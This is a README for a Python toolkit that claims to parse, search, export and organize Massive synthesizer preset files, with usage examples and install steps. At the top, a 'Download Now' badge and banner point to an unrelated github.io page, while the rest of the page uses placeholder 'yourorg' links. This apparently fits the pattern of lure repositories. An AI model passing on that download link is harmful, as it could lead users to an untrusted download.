# massive-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://ajuu000.github.io/massive-zone-lzy/)


[![Banner](banner.png)](https://ajuu000.github.io/massive-zone-lzy/)


[![PyPI version](https://badge.fury.io/py/massive-toolkit.svg)](https://badge.fury.io/py/massive-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build Status](https://img.shields.io/github/actions/workflow/status/yourorg/massive-toolkit/ci.yml)](https://github.com/yourorg/massive-toolkit/actions)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating workflows, processing preset files, and analyzing patch data associated with the **Massive synthesizer** on Windows environments.

Whether you are managing large preset libraries, batch-processing `.nmsv` patch files, or building data pipelines around your Massive workflow, this toolkit provides a clean, Pythonic interface to get the job done.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 🎛️ **Preset File Parsing** — Read, inspect, and extract metadata from Massive `.nmsv` patch files
- 📁 **Batch Processing** — Scan entire preset library directories and process files in bulk
- 📊 **Data Extraction & Analysis** — Pull oscillator settings, modulation routing, and macro assignments into structured Python objects
- 🔄 **Workflow Automation** — Script repetitive tasks such as renaming, categorizing, and organizing patch libraries
- 🔍 **Search & Filter** — Query your preset collection by tag, category, author, or parameter value
- 📤 **Export Utilities** — Serialize patch metadata to JSON, CSV, or SQLite for further analysis
- 🪵 **Logging & Reporting** — Generate summary reports on your preset library composition
- 🧩 **Extensible Architecture** — Plugin-friendly design makes it easy to add custom processors

---

## Installation

### From PyPI

```bash
pip install massive-toolkit
```

### From Source

```bash
git clone https://github.com/yourorg/massive-toolkit.git
cd massive-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

```bash
# For data analysis and export features
pip install massive-toolkit[analysis]

# For full development environment
pip install massive-toolkit[dev]
```

---

## Quick Start

```python
from massive_toolkit import PresetLibrary

# Point the toolkit at your Massive preset directory
library = PresetLibrary(r"C:\Users\YourName\Documents\Native Instruments\Massive\Presets")

# Load and inspect all presets
library.scan()

print(f"Found {len(library)} presets")

# Grab a single preset and inspect its metadata
preset = library["Bass Wobble 01"]
print(preset.name)        # 'Bass Wobble 01'
print(preset.category)    # 'Bass'
print(preset.author)      # 'NI Factory'
print(preset.tags)        # ['bass', 'wobble', 'dubstep']
```

---

## Usage Examples

### Scanning a Preset Library

```python
from massive_toolkit import PresetLibrary

library = PresetLibrary(r"C:\Users\YourName\Documents\Native Instruments\Massive\Presets")
library.scan(recursive=True)

# Summarize what was found
summary = library.summary()
print(summary)
# {
#   "total_presets": 1482,
#   "categories": {"Bass": 312, "Lead": 204, "Pad": 189, ...},
#   "authors": {"NI Factory": 800, "Community": 682}
# }
```

---

### Extracting Patch Metadata

```python
from massive_toolkit import PresetParser

parser = PresetParser()

# Parse a single .nmsv file
patch = parser.parse(r"C:\path\to\preset\Dark Lead.nmsv")

# Access structured patch data
print(patch.name)               # 'Dark Lead'
print(patch.category)           # 'Lead'
print(patch.bpm_sync)           # True
print(patch.macros)             # {'Macro 1': 0.75, 'Macro 2': 0.3, ...}
print(patch.oscillators[0])     # {'waveform': 'Saw', 'pitch': 0, 'level': 0.9}

# Access modulation routing
for route in patch.mod_routes:
    print(f"{route.source} -> {route.destination} (depth={route.depth:.2f})")
```

---

### Batch Processing and Exporting

```python
from massive_toolkit import PresetLibrary
from massive_toolkit.exporters import CSVExporter, JSONExporter

library = PresetLibrary(r"C:\Users\YourName\Documents\Native Instruments\Massive\Presets")
library.scan()

# Filter presets by category
bass_presets = library.filter(category="Bass")
print(f"Bass presets found: {len(bass_presets)}")

# Export filtered results to CSV
exporter = CSVExporter()
exporter.export(bass_presets, output_path="bass_presets.csv")

# Or export full library metadata to JSON
json_exporter = JSONExporter(pretty=True)
json_exporter.export(library, output_path="library_snapshot.json")
```

---

### Searching and Filtering

```python
from massive_toolkit import PresetLibrary

library = PresetLibrary(r"C:\Users\YourName\Documents\Native Instruments\Massive\Presets")
library.scan()

# Search by keyword across name and tags
results = library.search("wobble")

# Filter by multiple criteria
filtered = library.filter(
    category="Bass",
    tags=["dubstep", "aggressive"],
    author="NI Factory"
)

for preset in filtered:
    print(f"{preset.name} | {preset.category} | {preset.author}")
```

---

### Organizing and Renaming Presets

```python
from massive_toolkit import PresetLibrary
from massive_toolkit.utils import organize_by_category

library = PresetLibrary(r"C:\Users\YourName\Documents\Native Instruments\Massive\Presets")
library.scan()

# Auto-organize presets into category subfolders
organize_by_category(
    library,
    output_dir=r"C:\Users\YourName\Documents\Massive_Organized",
    dry_run=True   # Set False to actually move files
)

# Batch rename using a naming template
library.batch_rename(
    template="{category}_{author}_{name}",
    dry_run=True
)
```

---

### Generating a Library Report

```python
from massive_toolkit import PresetLibrary
from massive_toolkit.reports import LibraryReport

library = PresetLibrary(r"C:\Users\YourName\Documents\Native Instruments\Massive\Presets")
library.scan()

report = LibraryReport(library)
report.generate(output_path="library_report.html", format="html")

# Console summary
report.print_summary()
# ┌─────────────────────────────────────────┐
# │          Massive Library Report         │
# ├──────────────┬──────────────────────────┤
# │ Total Presets│ 1482                     │
# │ Categories   │ 14                       │
# │ Authors      │ 23                       │
# │ Tagged       │ 1201 (81%)               │
# └──────────────┴──────────────────────────┘
```

---

## Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | 3.8+ | 3.10+ recommended |
| `lxml` | ≥ 4.9 | XML parsing of `.nmsv` files |
| `click` | ≥ 8.0 | CLI interface |
| `rich` | ≥ 13.0 | Terminal output formatting |
| `pandas` | ≥ 1.5 *(optional)* | Data analysis features |
| `jinja2` | ≥ 3.1 *(optional)* | HTML report generation |
| Windows 10/11 | — | Required for live preset path detection |

> **Note:** Core parsing and export features work cross-platform. Windows is only required for automatic Massive installation path detection. Manual path configuration works on macOS and Linux.

---

## Project Structure

```
massive-toolkit/
├── massive_toolkit/
│   ├── __init__.py
│   ├── library.py          # PresetLibrary class
│   ├── parser.py           # PresetParser and patch data models
│   ├── exporters/
│   │   ├── csv_exporter.py
│   │   ├── json_exporter.py
│   │   └── sqlite_exporter.py
│   ├── reports/
│   │   └── library_report.py
│   └── utils/
│       ├── organizer.py
│       └── renamer.py
├── tests/
├── docs/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository
2. **Create a feature branch** — `git checkout -b feature/your-feature-name`
3. **Write tests** for new functionality in the `tests/` directory
4. **Run the test suite** — `pytest tests/ --cov=massive_toolkit`
5. **Format your code** — `black massive_toolkit/ && ruff check massive_toolkit/`
6. **Submit a Pull Request** with a clear description of the change

### Development Setup

```bash
git clone https://github.com/yourorg/massive-toolkit.git
cd massive-toolkit
python -m venv venv
venv\Scripts\activate        # Windows
# source venv/bin/activate   # macOS/Linux
pip install -e ".[dev]"
pre-commit install
```

### Reporting Issues

Please use the [GitHub Issues](https://github.com/yourorg/massive-toolkit/issues) tracker. Include your Python version, OS, and a minimal reproducible example when filing a bug report.

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2024 massive-toolkit contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions: ...
```

---

## Acknowledgements

- Thanks to the synthesizer and sound design community for documenting the Massive preset file format
- Built with [lxml](https://lxml.de/), [Rich](https://github.com/Textualize/rich), and [Click](https://click.palletsprojects.com/)
- Inspired by similar toolkits in the audio software ecosystem

---

*This toolkit is an independent open-source project and is not affiliated with or endorsed by Native Instruments.*